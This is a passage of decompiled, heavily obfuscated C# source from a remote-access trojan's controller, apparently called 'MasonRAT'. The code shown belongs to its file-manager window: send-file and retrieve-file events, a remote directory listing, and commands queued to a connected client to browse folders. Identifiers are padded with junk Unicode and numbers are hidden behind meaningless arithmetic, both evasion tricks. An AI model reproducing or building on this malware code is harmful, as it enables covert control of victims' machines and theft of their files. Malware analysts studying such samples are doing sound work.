        masonRatڟﻋۡـٻ̍ـڅ̨ۙڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڟﻋۡـ\u060Aٻ̍ـڅ̨ۙڙ = value;
      ToolStripMenuItem masonRatڟﻋۡـٻ̍ـڅ̨ۙڙ2 = this.\u2694️MasonRAT\u270Cڟﻋۡـ\u060Aٻ̍ـڅ̨ۙڙ;
      if (masonRatڟﻋۡـٻ̍ـڅ̨ۙڙ2 == null)
        return;
      masonRatڟﻋۡـٻ̍ـڅ̨ۙڙ2.Click += eventHandler;
    }
  }

  internal virtual Guna2GradientButton \u2694️MasonRAT\u270Cــ\u060Cئ\u0608ﻋ\u060Aڙـىٺ\u060Dڙـ\u060A\u0609
  {
    get => this.\u2694️MasonRAT\u270C\u0609ۛـٸ\u0608ٺٺـּ\u060Aدـــ\u060Dــحﻼ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـْٽـټټـڞ\u0609\u060Bـ\u0609\u060Eڕٺ\u0608);
      Guna2GradientButton ratۛـٸٺٺـּدـــــحﻼ1 = this.\u2694️MasonRAT\u270C\u0609ۛـٸ\u0608ٺٺـּ\u060Aدـــ\u060Dــحﻼ;
      if (ratۛـٸٺٺـּدـــــحﻼ1 != null)
        ratۛـٸٺٺـּدـــــحﻼ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609ۛـٸ\u0608ٺٺـּ\u060Aدـــ\u060Dــحﻼ = value;
      Guna2GradientButton ratۛـٸٺٺـּدـــــحﻼ2 = this.\u2694️MasonRAT\u270C\u0609ۛـٸ\u0608ٺٺـּ\u060Aدـــ\u060Dــحﻼ;
      if (ratۛـٸٺٺـּدـــــحﻼ2 == null)
        return;
      ratۛـٸٺٺـּدـــــحﻼ2.Click += eventHandler;
    }
  }

  public event FM.SendFileEventHandler \u2694️MasonRAT\u270C\u0609\u060Cــمـﻼ̍\u060Fــ;

  public event FM.RetrieveFileEventHandler \u2694️MasonRAT\u270C̍ٸٸڠﻻ\u060Cــطـ\u0608̨;

  private void \u2694️MasonRAT\u270Cـٸﮪڙٺﻻ̍\u0608طﻋـؤۏ(object sender, EventArgs e)
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 259)));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Controls.Add((Control) this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة);
    this.\u2694️MasonRAT\u270Cٺ\u060Dۙﻋ\u0609\u0609\u060Cּ\u060Dٽڙءﮪټڟ̍ۙ\u060D\u0608ة.Visible = false;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[1].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[((817305242 ^ 1604188529 << 1110801838) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - ((662023003 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 << 1607893563 - 847426770 % 586078712 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[(~368010263 - 963522191 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + ((-488736915 ^ -1383864889) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[((100498429 ^ (21590942 | 100424180)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ 1869447262 - 1869447255 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[((-1333713203 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + ((1332531497 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 | -1629557086 - -1887414670 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[((28 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ (480544288 >> 451249993) - 938543 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns[((-274691754 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0 ^ ((-1613048989 ^ ~1201385145) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) << (2130044885 ^ (2071574259 | 251315619)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0].TextAlign = HorizontalAlignment.Left;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.View = View.Details;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.HideSelection = false;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.OwnerDraw = true;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.GridLines = false;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.DrawColumnHeader += new DrawListViewColumnHeaderEventHandler(this.\u2694️MasonRAT\u270Cئۚ\u0608ڙڟ\u060B\u0609\u0608ٻحۡــءڙــ\u060A);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.DrawItem += new DrawListViewItemEventHandler(this.\u2694️MasonRAT\u270C\u0609\u060Aٺ\u060Dڞــ\u0609\u060Dـڝ\u060A\u060Bڙ);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.DrawSubItem += new DrawListViewSubItemEventHandler(this.\u2694️MasonRAT\u270Cـ\u0608ټـ\u060Eۙـ\u060Dـٺ\u060A\u0608\u060Cۙ\u060Eـ\u060A\u060A);
  }

  private void \u2694️MasonRAT\u270Cئۚ\u0608ڙڟ\u060B\u0609\u0608ٻحۡــءڙــ\u060A(
    object sender,
    DrawListViewColumnHeaderEventArgs e)
  {
    SolidBrush solidBrush = new SolidBrush(Color.FromArgb((73102680 + 1472771801 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 ^ (1308376197 | 58259235) - 1327888028 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 << (791151058 - 3117352 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0), -898596163 - ~1102019955 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + (-1184608487 - (1222491611 | 1992170433) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 << 1477633667 - 878585967 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 212139249 + (86568187 | 263000434) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 + -((-1667138955 ^ -2131525394) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0));
    Color white = Color.White;
    e.DrawBackground();
    e.Graphics.FillRectangle((Brush) solidBrush, e.Bounds);
    TextRenderer.DrawText((IDeviceContext) e.Graphics, e.Header.Text, e.Font, e.Bounds, white);
  }

  private void \u2694️MasonRAT\u270Cد\u060Eــدۧﻋٺد\u060A\u060Fٻﻻ\u060F\u060Aد(
    object sender,
    DrawListViewColumnHeaderEventArgs e)
  {
    SolidBrush solidBrush = new SolidBrush(Color.FromArgb((-558851370 - (122923085 >> 1282117259) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) - (-323046559 - -1361856418 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 << (1487614200 - (915285072 | 298618868) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), 2138828033 - (2104612339 | 2000324662) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 - ((498330422 ^ 1794346877 >> 1219660183) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 >> (1674353569 - 85909872 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, -537587371 - 1953875422 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 + ~((78673088 ^ (1657474916 | 755251621)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0));
    Color white = Color.White;
    e.DrawBackground();
    e.Graphics.FillRectangle((Brush) solidBrush, e.Bounds);
    TextRenderer.DrawText((IDeviceContext) e.Graphics, e.Header.Text, e.Font, e.Bounds, white);
  }

  private void \u2694️MasonRAT\u270C\u0609\u060Aٺ\u060Dڞــ\u0609\u060Dـڝ\u060A\u060Bڙ(
    object sender,
    DrawListViewItemEventArgs e)
  {
    e.DrawDefault = true;
  }

  private void \u2694️MasonRAT\u270Cـ\u0608ټـ\u060Eۙـ\u060Dـٺ\u060A\u0608\u060Cۙ\u060Eـ\u060A\u060A(
    object sender,
    DrawListViewSubItemEventArgs e)
  {
    e.DrawDefault = true;
  }

  private void \u2694️MasonRAT\u270Cـۚ\u060Bۏ̍ۨ\u0609ۛ\u060Dـ\u060B\u0608دټٺــ(
    object sender,
    FormClosingEventArgs e)
  {
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Items.Clear();
  }

  private void \u2694️MasonRAT\u270Cـڠؤۜٸﻼ\u060A\u0608ۚڇ(object sender, EventArgs e)
  {
    try
    {
      if (!(this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == 0 | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == 1 | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == (-1141513813 - 1801542093 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 + -((1351911371 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1) | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == 1925353046 - -1984836473 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 - -(-1856947316 - 2053242199 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0 | this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.ImageIndex == (-606172415 - ~606172408 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + ((906329598 ^ 872812460 % 2074197092) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0 >> (877724182 ^ 1481340275 << 1741406749) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)))
        return;
      if (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Length == 0)
      {
        Guna2TextBox masonRatىٽــ؁̨ـۙۧڞ;
        string str = (masonRatىٽــ؁̨ـۙۧڞ = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ).Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text;
        masonRatىٽــ؁̨ـۙۧڞ.Text = str;
      }
      else
      {
        Guna2TextBox masonRatىٽــ؁̨ـۙۧڞ;
        string str = (masonRatىٽــ؁̨ـۙۧڞ = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ).Text + this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FocusedItem.Text + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 260);
        masonRatىٽــ؁̨ـۙۧڞ.Text = str;
      }
      this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  public void \u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F()
  {
    Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 261) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text));
    Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
  }

  private void \u2694️MasonRAT\u270C\u060Dدـ\u060Fﻻ\u060Fبڛمـڙ\u0608ﻼْـْ\u060Aڟـ(
    object sender,
    EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Length < (-768416717 - 1350848560 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ ~((2119265251 ^ 922565663 >> 376882937) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0))
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 262);
        Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 263) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ));
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
      else
      {
        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 264)));
